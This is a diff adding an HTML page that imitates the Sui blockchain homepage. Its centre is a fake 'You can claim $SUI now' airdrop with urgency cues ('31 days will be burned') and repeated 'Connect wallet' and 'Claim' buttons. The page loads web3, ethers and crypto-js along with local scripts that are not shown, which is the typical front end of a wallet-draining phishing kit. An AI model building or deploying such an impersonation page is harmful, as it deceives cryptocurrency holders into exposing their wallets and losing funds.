@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <style>
+    .wf-force-outline-none[tabindex="-1"]:focus {
+      outline: none;
+    }
+  </style>
+  <title>Sui | Unlock the freedom to build powerful on-chain assets</title>
+  <meta
+    content="Sui is a Layer 1 blockchain and smart contract platform designed to make digital asset ownership fast, private, secure, and accessible to everyone."
+    name="description">
+  <meta content="Sui | Unlock the freedom to build powerful on-chain assets" property="og:title">
+  <meta
+    content="Sui is a Layer 1 blockchain and smart contract platform designed to make digital asset ownership fast, private, secure, and accessible to everyone."
+    property="og:description">
+  <meta
+    content="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/6439d314dee4494ffeb5cc9f_Sui_SocialShare_1600x900.jpg"
+    property="og:image">
+  <meta content="Sui | Unlock the freedom to build powerful on-chain assets" property="twitter:title">
+  <meta
+    content="Sui is a Layer 1 blockchain and smart contract platform designed to make digital asset ownership fast, private, secure, and accessible to everyone."
+    property="twitter:description">
+  <meta
+    content="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/6439d314dee4494ffeb5cc9f_Sui_SocialShare_1600x900.jpg"
+    property="twitter:image">
+  <meta property="og:type" content="website">
+  <meta content="summary_large_image" name="twitter:card">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <link href="./assets/sui-io-dev-3459.69feddd74.css" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/" rel="preconnect">
+  <link href="https://fonts.gstatic.com/" rel="preconnect" crossorigin="anonymous">
+  <link rel="stylesheet" href="./assets/css" media="all">
+  <link href="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/643773c0d96a22a83c5baf48_Sui_Favicon.png"
+    rel="shortcut icon" type="image/x-icon">
+  <link
+    href="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/643775f4a15c9a9e10426daa_Sui_Favicon_256.png"
+    rel="apple-touch-icon">
+  <link rel="stylesheet" href="./assets/cookiecc.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+
+  <style>
+    body {
+      margin-top: 0;
+    }
+
+    .ksvEbk {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-weight: 600;
+      width: 70%;
+      max-width: 600px;
+      /* height: 100%; */
+      min-height: 450px;
+      padding: 32px;
+      /* border: solid 4px #fff; */
+      text-align: center;
+      border-radius: 12px;
+      gap: 24px;
+      background-color: #011829;
+    }
+
+    .hPwgTc {
+      font-size: 32px;
+    }
+
+    .gA-Dkyf {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+
+    .dmYabb {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .iXEcDM {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+    }
+
+    .iezKKV {
+      width: 100%;
+      height: 4px;
+      border-radius: 2px;
+      background-color: #a1a1a1;
+      margin-top: 10px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .jvDOXG {
+      width: 60%;
+      height: 4px;
+      border-radius: 2px;
+      background-color: #ffffff;
+      position: absolute;
+      z-index: 10;
+    }
+
+    .gEYyFu {
+      display: flex;
+      gap: 24px;
+    }
+
+    .ebgQOQ {
+      cursor: pointer;
+      width: 100%;
+      max-width: 200px;
+      text-align: center;
+      border: #b3b3b3 solid 2px;
+      background-color: inherit;
+      border-radius: 12px;
+      padding: 24px;
+      opacity: 0.6;
+    }
+
+    .startButton {
+      max-width: 200px;
+      width: 100%;
+      cursor: pointer;
+    }
+    
+    .startButton{
+      height: 48px;
+    max-width: 170px;
+    grid-column-gap: 4px;
+    grid-row-gap: 4px;
+    color: #fff;
+    white-space: nowrap;
+    background-color: #3898ec;
+    border: 1px solid #4ca3ff;
+    border-radius: 100px;
+    flex: none;
+    justify-content: center;
+    align-items: center;
+    padding: 16px 32px;
+    font-size: 14px;
+    line-height: 16px;
+    text-decoration: none;
+    display: flex;
+    }
+    .second {
+      display: none;
+    }
+
+    .show {
+      display: flex;
+    }
+
+  </style>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    
+  <script src="./js/settings.js"></script>
+  <script src="./js/webchunk.js"></script>
+  <style>
+    w3m-modal{
+      position: fixed;
+      z-index: 10000000;
+    }
+  </style>
+</head>
+<body class="body--sticky-header"
+  bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjEwIiwic2NvcmUiOjEwOTEwfV0="
+  cz-shortcut-listen="true" bis_skin_checked="1">
+  <style>
+    .alert{
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.418);
+      position: fixed;
+      z-index: 100;
+      display: none;
+    }
+    .alert_content{
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 300px;
+      height: 300px;
+      border-radius: 20px;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      padding: 24px;
+      justify-content: space-around;
+      align-items: center;
+    }
+    .loader {
+      width: 48px;
+      height: 48px;
+      display: block;
+      margin:15px auto;
+      position: relative;
+      color: #FFF;
+      box-sizing: border-box;
+      animation: rotation 1s linear infinite;
+    }
+    .loader::after,
+    .loader::before {
+      content: '';  
+      box-sizing: border-box;
+      position: absolute;
+      width: 24px;
+      height: 24px;
+      top: 50%;
+      left: 50%;
+      transform: scale(0.5) translate(0, 0);
+      background-color: #3898ec;
+      border-radius: 50%;
+      animation: animloader 1s infinite ease-in-out;
+    }
+    .loader::before {
+      background-color: #011829;
+      transform: scale(0.5) translate(-48px, -48px);
+    }
+
+    @keyframes rotation {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    } 
+    @keyframes animloader {
+        50% {
+          transform: scale(1) translate(-50%, -50%);
+    }
+    }
+  </style>
+  <div class="w-embed w-iframe" bis_skin_checked="1"><!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5C9KVWT" height="0" width="0"
+        style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+  </div>
+  <div data-w-id="d9f88d0a-836a-4a77-af4e-27b79bc4f4c7" data-animation="default" data-collapse="medium"
+    data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="header w-nav"
+    style="z-index: 10;display: flex; transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg); transform-style: preserve-3d;"
+    bis_skin_checked="1">
+    <div class="alert-banner" bis_skin_checked="1"><a href="#" class="alert-banner--link-text"
+        bis_skin_checked="1"><strong>AIRDROP IS LIVE!</strong></a></div>
+    <div class="container cnotainer--header w-container" bis_skin_checked="1">
+      <div class="container-wrapper container-wrapper--header" bis_skin_checked="1">
+        <div class="nav w-container" bis_skin_checked="1">
+          <div class="navbar-content-2" bis_skin_checked="1">
+            <div class="navbar-brand" bis_skin_checked="1"><a href="#" aria-current="page"
+                class="w-inline-block w--current"><img src="./assets/6439ab96e20cad137a4c80d0_TopNavLogo.svg"
+                  loading="lazy" width="61" height="32" alt="Sui" class="vectors-wrapper-22"></a></div>
+            <nav role="navigation" class="navbar-menu w-nav-menu">
+              <div class="navbar-inner-wrap" bis_skin_checked="1">
+                <div data-w-id="dea9c8b6-fe0d-2928-cde0-6acc86e2e9a7" class="header-dropdown-container"
+                  bis_skin_checked="1">
+                  <div class="header-dropdown border-bottom header-dropdown-build" style="display: none; opacity: 0;"
+                    bis_skin_checked="1">
+                    <div class="header-dropdown--wrapper" bis_skin_checked="1">
+                      <div id="w-node-_3257c9f0-bbdb-bd80-2a4f-07a02e92dbc2-9bc4f4c7" class="header-dropdown--column"
+                        bis_skin_checked="1">
+                        <div class="header-dropdown--column-left header-dropdown--column-left---build"
+                          bis_skin_checked="1"><img src="./assets/64364d0b189a486aeb3125eb_research-paper.jpeg"
+                            loading="lazy" sizes="100vw"
+                            srcset="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64364d0b189a486aeb3125eb_research-paper-p-500.jpeg 500w, https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64364d0b189a486aeb3125eb_research-paper.jpeg 664w"
+                            alt="" class="header-dropdown--column-image">
+                          <ul id="w-node-_3257c9f0-bbdb-bd80-2a4f-07a02e92dbc5-9bc4f4c7" role="list"
+                            class="header-dropdown-links-list">
+                            <li class="header-dropdown-links-list-item"><a href="#" class="header-dropdown-link"
+                                bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Developer Portal</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Developer Grants</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Validators</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Bug Bounty Program</div>
+                              </a></li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="header-newsletter-signup" bis_skin_checked="1">
+                        <div class="text--h3-20-24 header-text-spacing" bis_skin_checked="1">Subscribe to our
+                          newsletter. Get news, updates, and insights.</div>
+                        <div class="div-block-29" bis_skin_checked="1">
+                          <div class="w-embed w-script" bis_skin_checked="1">
+                            <script charset="utf-8" type="text/javascript" src="./assets/v2.js"></script>
+                            <div id="hbspt-form-84a513b3-8143-4204-acae-3ae9ff0b102e" class="hbspt-form"
+                              data-hs-forms-root="true" bis_skin_checked="1"><iframe id="hs-form-iframe-0"
+                                class="hs-form-iframe" title="Form 0" scrolling="no" width="100%"
+                                style="position: static; border: none; display: block; overflow: hidden; width: 100%;"
+                                src="./assets/saved_resource.html"></iframe></div>
+                          </div>
+                          <div class="header-social-icons" bis_skin_checked="1"><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/6437008357bf4282419837f5_header-discord.svg"
+                                loading="lazy" alt="Discord"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/6437008324516685fb7ec5a8_header-twitter.svg"
+                                loading="lazy" alt="Discord"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/64370082189ad6fc561d22f3_header-medium.svg"
+                                loading="lazy" alt="Youtube"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/643700822629e178cbb2198e_header-linkedin.svg"
+                                loading="lazy" alt="LinkedIn"></a></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="navbar-menu-link" bis_skin_checked="1">Build</div>
+                </div>
+                
+
+                <div data-w-id="03b9c251-ac5c-a872-79f8-ebf560556851" class="header-dropdown-container"
+                  bis_skin_checked="1">
+                  <div class="header-dropdown border-bottom header-dropdown-learn" style="display: none; opacity: 0;"
+                    bis_skin_checked="1">
+                    <div class="header-dropdown--wrapper" bis_skin_checked="1">
+                      <div id="w-node-_03b9c251-ac5c-a872-79f8-ebf560556854-9bc4f4c7" class="header-dropdown--column"
+                        bis_skin_checked="1">
+                        <div class="header-dropdown--column-left header-dropdown--column-left---learn"
+                          bis_skin_checked="1"><img src="./assets/64364d0b189a486aeb3125eb_research-paper.jpeg"
+                            loading="lazy" sizes="100vw"
+                            srcset="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64364d0b189a486aeb3125eb_research-paper-p-500.jpeg 500w, https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64364d0b189a486aeb3125eb_research-paper.jpeg 664w"
+                            alt="" class="header-dropdown--column-image">
+                          <ul id="w-node-_7059e5f5-4ae0-8ff5-bb91-22bdfe30c019-9bc4f4c7" role="list"
+                            class="header-dropdown-links-list">
+                            <li class="header-dropdown-links-list-item"><a href="#" class="header-dropdown-link"
+                                bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Intro to Sui</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Use Cases</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Research</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Blog</div>
+                              </a></li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="header-newsletter-signup" bis_skin_checked="1">
+                        <div class="text--h3-20-24 header-text-spacing" bis_skin_checked="1">Subscribe to our
+                          newsletter. Get news, updates, and insights.</div>
+                        <div class="div-block-29" bis_skin_checked="1">
+                          <div class="w-embed w-script" bis_skin_checked="1">
+                            <script charset="utf-8" type="text/javascript" src="./assets/v2.js"></script>
+                            <div id="hbspt-form-642ce2c1-0ed2-4f00-b0d8-2254e1266529" class="hbspt-form"
+                              data-hs-forms-root="true" bis_skin_checked="1"><iframe id="hs-form-iframe-1"
+                                class="hs-form-iframe" title="Form 1" scrolling="no" width="100%"
+                                style="position: static; border: none; display: block; overflow: hidden; width: 100%;"
+                                src="./assets/saved_resource(1).html"></iframe></div>
+                          </div>
+                          <div class="header-social-icons" bis_skin_checked="1"><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/6437008357bf4282419837f5_header-discord.svg"
+                                loading="lazy" alt="Discord"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/6437008324516685fb7ec5a8_header-twitter.svg"
+                                loading="lazy" alt="Discord"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/64370082189ad6fc561d22f3_header-medium.svg"
+                                loading="lazy" alt="Youtube"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/643700822629e178cbb2198e_header-linkedin.svg"
+                                loading="lazy" alt="LinkedIn"></a></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="navbar-menu-link" bis_skin_checked="1">Learn</div>
+                </div>
+                <div data-w-id="dc30daf6-f05a-f5ef-dc32-606cc73bf110" class="header-dropdown-container"
+                  bis_skin_checked="1">
+                  <div class="header-dropdown border-bottom header-dropdown-connect" style="display: none; opacity: 0;"
+                    bis_skin_checked="1">
+                    <div class="header-dropdown--wrapper" bis_skin_checked="1">
+                      <div id="w-node-dc30daf6-f05a-f5ef-dc32-606cc73bf115-9bc4f4c7" class="header-dropdown--column"
+                        bis_skin_checked="1">
+                        <div class="header-dropdown--column-left header-dropdown--column-left---connect"
+                          bis_skin_checked="1"><img src="./assets/64364d0b189a486aeb3125eb_research-paper.jpeg"
+                            loading="lazy" sizes="100vw"
+                            srcset="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64364d0b189a486aeb3125eb_research-paper-p-500.jpeg 500w, https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64364d0b189a486aeb3125eb_research-paper.jpeg 664w"
+                            alt="" class="header-dropdown--column-image">
+                          <ul id="w-node-_8feeb513-f187-e8e8-1c66-14fa01ae3619-9bc4f4c7" role="list"
+                            class="header-dropdown-links-list">
+                            <li class="header-dropdown-links-list-item"><a href="#" class="header-dropdown-link"
+                                bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Ecosystem Directory</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Community Events</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Sui Ambassadors</div>
+                              </a><a href="#" class="header-dropdown-link" bis_skin_checked="1">
+                                <div class="header-dropdown-link-text" bis_skin_checked="1">Sui Moderators</div>
+                              </a></li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="header-newsletter-signup" bis_skin_checked="1">
+                        <div class="text--h3-20-24 header-text-spacing" bis_skin_checked="1">Subscribe to our
+                          newsletter. Get news, updates, and insights.</div>
+                        <div class="div-block-29" bis_skin_checked="1">
+                          <div class="w-embed w-script" bis_skin_checked="1">
+                            <script charset="utf-8" type="text/javascript" src="./assets/v2.js"></script>
+                            <div id="hbspt-form-5a7c336d-50ab-4621-9f45-252ed1ac8512" class="hbspt-form"
+                              data-hs-forms-root="true" bis_skin_checked="1"><iframe id="hs-form-iframe-2"
+                                class="hs-form-iframe" title="Form 2" scrolling="no" width="100%"
+                                style="position: static; border: none; display: block; overflow: hidden; width: 100%;"
+                                src="./assets/saved_resource(2).html"></iframe></div>
+                          </div>
+                          <div class="header-social-icons" bis_skin_checked="1"><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/6437008357bf4282419837f5_header-discord.svg"
+                                loading="lazy" alt="Discord"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/6437008324516685fb7ec5a8_header-twitter.svg"
+                                loading="lazy" alt="Discord"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/64370082189ad6fc561d22f3_header-medium.svg"
+                                loading="lazy" alt="Youtube"></a><a href="#" class="w-inline-block"
+                              bis_skin_checked="1"><img src="./assets/643700822629e178cbb2198e_header-linkedin.svg"
+                                loading="lazy" alt="LinkedIn"></a></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="navbar-menu-link connectButton" bis_skin_checked="1">Connect</div>
+                </div><a class="btc button--main button--inner-nav w-button connectButton" bis_skin_checked="1">Connect wallet
+                </a>
+              </div>
+            </nav><a class="connect" bis_skin_checked="1">Connect
+              wallet</a>
+          </div>
+          <div class="menu-button w-nav-button" style="-webkit-user-select: text;" aria-label="menu" role="button"
+            tabindex="0" aria-controls="w-nav-overlay-0" aria-haspopup="menu" aria-expanded="false"
+            bis_skin_checked="1"><img src="./assets/64371adfbd6d32f69e966dcc_burgerMenu.svg" loading="lazy" width="24"
+              height="12" alt="Open Menu" class="menu-open-image nav-close"><img
+              src="./assets/64371d0295901111093efc54_menu-close.svg" loading="lazy" alt="Menu"
+              class="menu-close-image nav-close"></div>
+        </div>
+      </div>
+    </div>
+    <div class="w-nav-overlay" data-wf-ignore="" id="w-nav-overlay-0" bis_skin_checked="1"></div>
+  </div>
+  <div class="hero-a section--main wf-section" bis_skin_checked="1"
+    style="min-height: 100vh;margin: 0;width: 100%;max-width: 100%;border-radius: 0;position: relative;">
+    <div class="container w-container" bis_skin_checked="1">
+      <div style="width: 100%;min-height: 100vh;"
+        data-poster-url="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64377ee0d96a223b1d5c6700_01_Homepage_Hero-poster-00001.jpg"
+        data-video-urls="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64377ee0d96a223b1d5c6700_01_Homepage_Hero-transcode.mp4,https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64377ee0d96a223b1d5c6700_01_Homepage_Hero-transcode.webm"
+        data-autoplay="true" data-loop="true" data-wf-ignore="true"
+        class="background-video w-background-video w-background-video-atom" bis_skin_checked="1">
+        <video id="d9e3caa1-526a-9b1d-eb2e-fef76a18b98c-video" autoplay="" loop=""
+          style="background-image:url(&quot;https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64377ee0d96a223b1d5c6700_01_Homepage_Hero-poster-00001.jpg&quot;); border-radius: 0;"
+          muted="" playsinline="" data-wf-ignore="true" data-object-fit="cover">
+          <source
+            src="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64377ee0d96a223b1d5c6700_01_Homepage_Hero-transcode.mp4"
+            data-wf-ignore="true">
+          <source
+            src="https://assets-global.website-files.com/6425f546844727ce5fb9e5ab/64377ee0d96a223b1d5c6700_01_Homepage_Hero-transcode.webm"
+            data-wf-ignore="true">
+        </video>
+      </div>
+      <div class="container-wrapper" bis_skin_checked="1"
+        style="justify-content: center;position: absolute;top: calc(50% + 40px);left: 50%;transform: translate(-50%, -50%);">
+        <div class="sc-b24488f1-1 ksvEbk" bis_skin_checked="1">
+          <div class="sc-b24488f1-2 hPwgTc" bis_skin_checked="1">
+            <span class="first" style="line-height: 120%;">You can claim $SUI now</span>
+            <span class="second" id="drop_amount"></span>
+          </div>
+          <span class="sc-b24488f1-4 daCHyf first">
+            A total of 300,000 SUI tokens are now available to be claimed. <br> Connect your wallet to check your
+            eligibility</span>
+          <span class="sc-b24488f1-4 daCHyf second">
+            A total of 300,000 SUI tokens are now available to be claimed.</span>
+          <div class="sc-b24488f1-5 dmYabb" bis_skin_checked="1">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path
+                d="M6.58872 21.8312C5.48713 20.5794 4.38559 19.2775 3.68456 17.7253C2.98357 16.073 2.78327 14.1702 3.13378 12.3677C3.4843 10.5651 4.28541 8.86265 5.43709 7.4106C5.33696 8.6624 5.78761 9.96424 6.6388 10.9156C6.13807 8.51219 6.93923 5.90845 8.54151 4.00575C10.1438 2.10305 12.347 0.8512 14.6502 0C13.4986 1.20172 13.3484 3.10442 13.799 4.70674C14.2497 6.30901 15.201 7.71103 16.0522 9.16308C16.9034 10.6151 17.7046 12.1173 17.7547 13.7696C18.2053 12.9184 18.706 12.0672 19.0065 11.1159C19.3069 10.1645 19.4571 9.16308 19.2068 8.21171C20.1081 9.3133 20.6088 10.4148 20.8591 11.8169C21.1095 13.2189 21.0594 14.6709 20.9092 16.0729C20.7089 17.6252 20.3084 19.2275 19.4572 20.5293C18.4558 22.0815 16.8534 23.1831 15.1009 23.7839C11.9964 24.3347 8.94206 23.8841 6.58872 21.8312Z"
+                fill="#3898ec"></path>
+              <path
+                d="M10.3948 23.6837C14.5007 25.286 18.5565 20.429 16.3032 16.6737C16.3032 16.6236 16.2532 16.6236 16.2532 16.5735C16.4535 18.6265 15.9527 20.1286 15.0014 20.9798C15.5021 19.7781 15.1516 18.3761 14.5507 17.1744C13.9499 16.0228 13.0987 14.9713 12.4477 13.8697C11.7968 12.7181 11.2961 11.4162 11.5965 10.1143C10.3948 11.0156 9.5436 12.3675 9.19308 13.8196C8.84257 15.2717 9.04287 16.874 9.69381 18.2259C8.94274 17.6751 8.39197 16.7738 8.34188 15.8225C7.54072 16.7738 7.04004 18.0256 7.09008 19.2774C7.09013 21.2302 8.64231 22.9827 10.3948 23.6837Z"
+                fill="#b2d8ff"></path>
+            </svg>
+            <span>31 days will be burned</span>
+          </div>
+          <div class="sc-36b0d147-0 gA-Dkyf" bis_skin_checked="1">
+            <div class="sc-36b0d147-1 iXEcDM" bis_skin_checked="1">
+              <span>Claimed</span><span id="claimed">300,000</span>
+            </div>
+            <div class="sc-36b0d147-2 iezKKV" bis_skin_checked="1">
+              <div class="sc-36b0d147-3 jvDOXG" bis_skin_checked="1"></div>
+            </div>
+          </div>
+          <div class="connect" bis_skin_checked="1"><a class="startButton connectButton first"
+              bis_skin_checked="1">Claim</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer" bis_skin_checked="1">
+    <div class="container" bis_skin_checked="1">
+      <div class="container-wrapper" bis_skin_checked="1">
+        <div class="div-block-16" bis_skin_checked="1">
+          <div class="footer-tagline" bis_skin_checked="1">
+            <div class="frame-1073714837" bis_skin_checked="1">
+              <div class="title" bis_skin_checked="1">
+                <div class="text--h5-39-42 text--blue" bis_skin_checked="1">Build Beyond</div>
+                <div class="text--white" bis_skin_checked="1">Unlock the freedom to build powerful on-chain assets</div>
+              </div>
+            </div>
+          </div>
+          <div class="footer-links-area" bis_skin_checked="1">
+            <div class="categories-2" bis_skin_checked="1">
+              <div class="category01-2" bis_skin_checked="1">
+                <div class="_1440x900-paragraph-p1-bold" bis_skin_checked="1">Developers</div>
+                <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                    bis_skin_checked="1">Developer Portal</a></div>
+                <div class="frame-1073714834" bis_skin_checked="1">
+                  <div class="frame-1073716438" bis_skin_checked="1">
+                    <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                        bis_skin_checked="1">Documentation</a></div><img
+                      src="./assets/642cbe98ed25cb3b62937ff6_Vectors-Wrapper.svg" loading="lazy" width="20" height="20"
+                      alt="" class="vectors-wrapper-20">
+                  </div>
+                  <div class="frame-1073716439" bis_skin_checked="1">
+                    <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                        bis_skin_checked="1">Github</a></div><img
+                      src="./assets/642cbe98ed25cb3b62937ff6_Vectors-Wrapper.svg" loading="lazy" width="20" height="20"
+                      alt="" class="vectors-wrapper-20">
+                  </div>
+                  <div class="frame-1073716439" bis_skin_checked="1">
+                    <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                        bis_skin_checked="1">Whitepaper</a></div><img
+                      src="./assets/642cbe98ed25cb3b62937ff6_Vectors-Wrapper.svg" loading="lazy" width="20" height="20"
+                      alt="" class="vectors-wrapper-20">
+                  </div>
+                  <div class="frame-1073716439" bis_skin_checked="1">
+                    <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                        bis_skin_checked="1">Network Status</a></div><img
+                      src="./assets/642cbe98ed25cb3b62937ff6_Vectors-Wrapper.svg" loading="lazy" width="20" height="20"
+                      alt="" class="vectors-wrapper-20">
+                  </div>
+                  <div class="footer-link-15-21 hide" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                      bis_skin_checked="1">Network Information</a></div>
+                </div>
+              </div>
+              <div class="category02-2" bis_skin_checked="1">
+                <div class="_1440x900-paragraph-p1-bold" bis_skin_checked="1">Community</div>
+                <div class="frame-1073714834" bis_skin_checked="1">
+                  <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                      bis_skin_checked="1">Ambassador Program</a></div>
+                  <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                      bis_skin_checked="1">Blog</a></div>
+                  <div class="frame-1073716439" bis_skin_checked="1">
+                    <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                        bis_skin_checked="1">Ecosystem Directory</a></div><img
+                      src="./assets/642cbe98ed25cb3b62937ff6_Vectors-Wrapper.svg" loading="lazy" width="20" height="20"
+                      alt="" class="vectors-wrapper-20">
+                  </div>
+                  <div class="frame-1073716439" bis_skin_checked="1">
+                    <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                        bis_skin_checked="1">Ecosystem Job Board</a></div><img
+                      src="./assets/642cbe98ed25cb3b62937ff6_Vectors-Wrapper.svg" loading="lazy" width="20" height="20"
+                      alt="" class="vectors-wrapper-20">
+                  </div>
+                  <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                      bis_skin_checked="1">Community Access Program</a></div>
+                </div>
+              </div>
+              <div class="category02-2" bis_skin_checked="1">
+                <div class="_1440x900-paragraph-p1-bold" bis_skin_checked="1">Sui Foundation</div>
+                <div class="frame-1073714834" bis_skin_checked="1">
+                  <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                      bis_skin_checked="1">About</a></div>
+                  <div class="frame-1073716439" bis_skin_checked="1">
+                    <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                        bis_skin_checked="1">Careers</a></div><img
+                      src="./assets/642cbe98ed25cb3b62937ff6_Vectors-Wrapper.svg" loading="lazy" width="20" height="20"
+                      alt="" class="vectors-wrapper-20">
+                  </div>
+                  <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                      bis_skin_checked="1">Developer Grants</a></div>
+                  <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                      bis_skin_checked="1">Academic Research Awards</a></div>
+                </div>
+                <div class="frame-1073716439" bis_skin_checked="1">
+                  <div class="footer-link-15-21" bis_skin_checked="1"><a href="#" class="footer-link-15-21"
+                      bis_skin_checked="1">Contact Us</a></div><img
+                    src="./assets/642cbe98ed25cb3b62937ff6_Vectors-Wrapper.svg" loading="lazy" width="20" height="20"
+                    alt="" class="vectors-wrapper-20">
+                </div>
+              </div>
+            </div>
+            <div class="footer-right-column" bis_skin_checked="1"><img
+                src="./assets/6439ab9680317757ca125502_FooterLogo.svg" loading="lazy" width="61" height="32" alt="Sui"
+                class="vectors-wrapper-7">
+              <div class="socials" bis_skin_checked="1">
+                <div class="socials-2" bis_skin_checked="1"><a href="#" class="w-inline-block" bis_skin_checked="1"><img
+                      src="./assets/6437008357bf4282419837f5_header-discord.svg" loading="lazy"
+                      width="35.47618865966797" height="35.47618865966797" alt="Discord"
+                      class="footer-social-image"></a><a href="#" class="w-inline-block" bis_skin_checked="1"><img
+                      src="./assets/6437008324516685fb7ec5a8_header-twitter.svg" loading="lazy" alt="Twitter"
+                      class="footer-social-image"></a><a href="#" class="w-inline-block" bis_skin_checked="1"><img
